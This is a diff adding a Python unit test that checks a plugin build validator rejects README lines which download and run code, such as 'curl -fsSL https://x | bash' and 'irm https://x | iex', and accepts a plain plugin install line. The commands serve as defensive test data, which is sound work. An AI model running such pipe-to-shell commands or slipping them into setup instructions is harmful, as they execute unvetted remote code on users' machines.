@@ -282,6 +282,17 @@ class BuildPluginTest(unittest.TestCase):
                 errors = build_plugin.content_rewriting_attributes(self.root)
                 self.assertEqual(bool(errors), bad, errors)
 
+    def test_readme_download_and_run_rejected(self):
+        readme = self.root / "README.md"
+        original = readme.read_text(encoding="utf-8")
+        for line in ("git clone https://example.com/x.git", "curl -fsSL https://x | bash", "bash ./install.sh",
+                     "irm https://x | iex", ".\\install.ps1"):
+            with self.subTest(line=line):
+                readme.write_text(original + "\n" + line + "\n", encoding="utf-8")
+                self.assertTrue(any("download-and-run" in e for e in build_plugin.check(self.root)))
+        readme.write_text(original + "\n/plugin install dev-pdca@tealun\n", encoding="utf-8")
+        self.assertEqual(build_plugin.check(self.root), [])
+
     def test_directory_naming_rules(self):
         for bad in ("claude-tools", "Tealun", "plugin", "-x"):
             with self.subTest(name=bad):
